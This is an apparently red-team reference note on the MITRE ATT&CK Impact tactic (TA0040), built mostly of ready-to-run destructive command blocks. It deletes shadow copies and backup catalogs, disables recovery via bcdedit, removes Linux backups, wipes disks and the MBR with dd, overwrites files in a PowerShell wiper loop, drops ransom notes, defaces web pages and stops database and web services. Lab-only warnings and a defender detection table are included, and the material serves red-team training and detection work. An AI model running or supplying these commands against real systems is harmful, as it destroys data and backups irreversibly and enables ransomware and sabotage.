---
type: tactic-hub
room: red
tactic: "Impact"
tactic_id: "TA0040"
tags: [red/impact, mitre/TA0040]
date_updated: {{date}}
---

# TA0040 — Impact

> [!quote]
> *"The Napoleon of Crime. The organizer of half that is evil and of nearly all that is undetected in this great city."*
> — *The Final Problem*

**MITRE Reference:** [TA0040](https://attack.mitre.org/tactics/TA0040/) | **Kill Chain Phase:** Actions on Objectives

The adversary is trying to manipulate, interrupt, or destroy systems and data. This is Moriarty's final move — ransomware, wipers, defacement, denial of service. Impact is the visible consequence of a successful intrusion, and the hardest to recover from.

---

## Techniques in This Tactic

| Technique ID | Name | Severity |
|-------------|------|---------|
| [[T1485 - Data Destruction]] | Data Destruction (wiper) | 🔴 Critical |
| [[T1486 - Data Encrypted for Impact]] | Ransomware | 🔴 Critical |
| [[T1491 - Defacement]] | Website / Internal Defacement | 🟠 High |
| [[T1499 - Endpoint Denial of Service]] | DoS / Resource Exhaustion | 🟠 High |
| [[T1498 - Network Denial of Service]] | DDoS | 🟠 High |
| [[T1490 - Inhibit System Recovery]] | Delete backups / VSS | 🔴 Critical |
| [[T1489 - Service Stop]] | Stop critical services | 🟠 High |
| [[T1529 - System Shutdown/Reboot]] | Force shutdown | 🟡 Medium |
| [[T1495 - Firmware Corruption]] | BIOS/UEFI wipe | 🔴 Critical |
| [[T1561 - Disk Wipe]] | MBR / partition wipe | 🔴 Critical |

---

## Inhibit System Recovery (T1490)

```cmd
rem Delete Volume Shadow Copies (Windows) — DONE FIRST before encryption
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

rem Disable Windows Backup
wbadmin delete catalog -quiet

rem Disable recovery environment
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
```

```bash
# Linux — destroy backups before wiping
rm -rf /var/backups /backup /mnt/backup 2>/dev/null

# Kill backup agents
systemctl stop bacula-fd amanda bareos-fd 2>/dev/null
pkill -f "rsync|duplicati|backuppc" 2>/dev/null

# Wipe rsync target
rsync --delete /tmp/empty/ /backup_target/
```

---

## Data Destruction / Wiper (T1485)

> [!caution] Destructive — Lab Only
> These techniques permanently destroy data. Never run on production without explicit authorisation.

```bash
# Overwrite files with random data (Linux)
shred -uzn 3 /path/to/file

# Wipe entire directory
find /target_dir -type f -exec shred -uzn 1 {} \;

# dd wipe (DESTRUCTIVE — destroys full disk)
dd if=/dev/urandom of=/dev/sda bs=4M status=progress

# Overwrite MBR (makes OS unbootable)
dd if=/dev/zero of=/dev/sda bs=512 count=1
```

```powershell
# PowerShell — overwrite and delete files
Get-ChildItem -Path C:\Target -Recurse -File | ForEach-Object {
    $bytes = [byte[]](1..($_.Length))
    [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
    Remove-Item $_.FullName -Force
}
```

---

## Ransomware Pre-Stage Simulation (T1486)

> [!caution] Lab Use Only

```powershell
# Enumerate target files
Get-ChildItem -Path C:\Users -Recurse -Include *.doc,*.docx,*.xlsx,*.pdf | Select-Object FullName

# Ransom note drop pattern
$note = "YOUR FILES ARE ENCRYPTED. Contact: attacker@onion.onion"
Get-ChildItem -Path C:\Users -Recurse -Directory | ForEach-Object {
    $note | Out-File -FilePath (Join-Path $_.FullName "README_DECRYPT.txt")
}
```

---

## Defacement (T1491)

```bash
# Web defacement — replace index page
cp /var/www/html/index.html /var/www/html/index.html.bak
cat > /var/www/html/index.html << 'EOF'
<html><body style="background:black;color:red;text-align:center">
<h1>Owned by [group]</h1>
</body></html>
EOF

# Internal defacement — wallpaper change (Windows)
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Temp\ransom.bmp" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
```

---

## Service Stop (T1489)

```bash
# Stop critical services (Linux)
for svc in mysql postgresql apache2 nginx; do
  systemctl stop $svc && systemctl disable $svc
done

# Windows
net stop "MSSQLSERVER" /y && sc config "MSSQLSERVER" start= disabled
net stop "MySQL80" /y
net stop "W3SVC" /y
```

---

## OPSEC Considerations

> [!warning] Impact Is Irreversible
> - VSS deletion before encryption is the #1 ransomware pre-indicator — EDRs catch this.
> - Impact is the end-game; operators deploy it only when ready to leave.
> - In red team engagements, **never** execute actual destructive commands on production.
> - Simulate impact by creating a ransom note and stopping services in a sandbox only.

---

## What Blue Sees

| Activity | Log Source | Event ID / Indicator |
|----------|-----------|---------------------|
| VSS deletion | System + Security | `vssadmin`, `wmic shadowcopy` → EventID 4688 |
| bcdedit modification | Security | 4688 — `bcdedit /set recoveryenabled No` |
| Mass file modification | AV / DLP | Thousands of file writes in seconds |
| Backup service stopped | System | 7036 — Backup service state change |
| MBR write | EDR | Raw disk write to sector 0 |
| Defacement | Web logs | PUT/POST to index file; FIM alert |

---

## Related Notes

- [[TA0010 - Exfiltration]] ← Data stolen before destruction (double extortion)
- [[TA0003 - Persistence]] ← Ensure foothold before triggering impact
- [[TA0009 - Collection]] ← Collect data to encrypt

↩ [[Red - Monographs]] · [[Red]] · [[Mind Palace]]
